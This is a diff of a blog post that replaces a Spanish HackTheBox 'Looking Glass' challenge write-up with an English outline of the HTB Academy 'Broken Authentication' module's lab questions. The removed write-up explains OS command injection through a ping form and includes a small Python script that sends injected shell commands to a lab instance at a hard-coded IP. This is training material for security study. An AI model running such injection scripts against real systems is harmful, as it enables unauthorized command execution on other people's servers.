@@ -1,79 +1,74 @@
 ---
 title: "Broken Authentication"
-excerpt: "**Broken Authentication** Module Walkthrough ' HackTheBox Academy"
+excerpt: "**Broken Authentication** Module Walkthrough - HackTheBox Academy"
 header:
   overlay_image: /assets/images/HTB_looking_glass/banner.png
   teaser: /assets/images/HTB_looking_glass/auth.jpg
   og_image: /assets/images/HTB_looking_glass/auth.jpg
 categories:
-  - HTB_Academy
+  - HTB-Academy
+  - Bug Bounty Hunter
 tags:
-  - HTB_Academy
-  - Challenge
+  - HTB-Academy
+  - Bug Bounty Hunter
   - Web
   - OWASP TOP 10
 ---
 ![image-center](\assets\images\HTB_looking_glass\auth.jpg)
-## ¿Qué es un Challenge en HTB?
-Los challenges de HackTheBox son pequeños desafíos para probar diferentes técnicas de pentesting. Tienen tres niveles de dificultad (Easy, Medium, Hard) según el color de su entrada, pero la dificultad real es calificada por los usarios que han completado el challenge en una escala de diez nieveles (desde "Piece of cake" a "Brainfuck")
+## Module Summary
+This module covers common vulnerabilities and misconfigurations regarding Authentication that could be leveraged to gain unauthorized access to a web application. Specifically, in this module, we will cover:
 
-Lo primero que debemos hacer es ir a la página web de Hack The Box y en la parte izquierda tenemos un menú en el que podemos ver varias secciones como *Labs*, *Ranking*, *Battleground*, etc. Seleccionamos la pestaña *Labs* y se nos muestra un desplegable, pulsamos en la opción Tracks como se muestra en la siguiente imagen.
+  - An overview of authentication methods
+  - Common protection mechanisms and possible bypasses
+  - Attacks against login processes
+  - Attacks against credential handling
 
-![image-center](\assets\images\HTB_looking_glass\tracks.png)
+## Default Credentials
 
-Este challenge está comprendido dentro del track de OWASP Top 10, que contiene 10 challenges de vulnerabilidades WEB con nivel de dificultad Easy:
-
-![image-center](\assets\images\HTB_looking_glass\owasp.png)
-
-Elegimos el challenge de looking glass:
-
-![image-center](\assets\images\HTB_looking_glass\looking_glass.png)
-
-Y ya podemos arrancar la máquina pulsando el boton de Start Instance:
-
-![image-center](\assets\images\HTB_looking_glass\looking_glass_2.png)
-
-Importante: para poder acceder a la máquina antes debemos conectarnos a la VPN.
-
-![image-center](\assets\images\HTB_looking_glass\vpn.png)
-
-## Looking glass challenge
-
-Segun la propia descripción del challenge:
-> _**“Hemos creado la herramienta más segura de networking en el mercado, ¡ven y pruébala!”**_
-
-Arrancamos la máquina y vemos que nos muestra:
-
-![image-center](\assets\images\HTB_looking_glass\vpn.png)
-
-Se aprecia un menú de opciones en el que podemos seleccionar entre el comando Ping y Traceroute y además podemos introducir manualmente la IP a la que queremos hacer Ping o Traceroute.
-
-Esto podría implementarse en el lado del servidor con la siguiente línea:
-```sh
-system("ping -c 4 " + IP);
-```
-Básicamente estamos pasando los parametros a Bash por lo que podríamos instertar un `;` en la variable IP, haciendo que lo que fuera detras de este punto y coma se interprete como un comando diferente:
-
-```sh
-system("ping -c 4 192.168.0.1; pwd");
-```
-
-En el ejemplo anterior `pwd` se ejecutaría como un comando separado.
+>*Q. Inspect the login page and perform a bruteforce attack. What is the valid username?
 
 
-```python
-from requests import post
 
-comando = input('Introduce el comando que quieres ejecutar:  ')
+## Weak Bruteforce Protections
 
-datos_post = {'test': 'ping', 'ip_address': f'206.189.125.57; {comando}', 'submit': 'Test'}
-respuesta = post('http://206.189.125.57:30011/', data=datos_post)
+>*Q. Observe the web application based at subdirectory /question1/ and infer rate limiting. What is the wait time imposed after an attacker hits the limit? (round to a 10-second timeframe, e.g., 10 or 20)
 
-data = respuesta.text
-data = data.split('loss\n')[-1]
-data = data.split('</textarea>')[0]
+>*Q. Work on webapp at URL /question2/ and try to bypass the login form using one of the method showed. What is the flag?
 
-print(data.strip())
-```
+## Brute Forcing Usernames
 
-Se trata de una vulnerabilidad RCE (Remote Code Execution) que explicaré en próximos posts.
+>*Q. Find the valid username on the web app based at the /question1/ subdirectory. PLEASE NOTE: Use the same wordlist for all four questions.
+
+>*Q. Find the valid username for the web application based at subdirectory /question2/.
+
+>*Q. Find the valid account name for the web application based at subdirectory /question3/.
+
+>*Q. Now find another way to discover the valid username for the web application based at subdirectory /question4/ .
+
+## Brute Forcing Passwords
+
+>*Q. Using rockyou-50.txt as password wordlist and htbuser as the username, find the policy and filter out strings that don't respect it. What is the valid password for the htbuser account?
+
+## Predictable Reset Token
+
+>*Q. Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?
+
+>*Q. Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?
+
+## Guessable Answers
+
+>*Q. Reset the htbadmin user's password by guessing one of the questions. What is the flag?
+
+## Username Injection
+
+>*Q. Login with the credentials "htbuser:htbuser" and abuse the reset password function to escalate to "htbadmin" user. What is the flag?
+
+## Brute Forcing Cookies
+
+>*Q. Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?
+
+>*Q. Log in to the target application and tamper the rememberme token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.
+
+## Skill Assessment - Broken Authentication
+
+>*Q. Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.
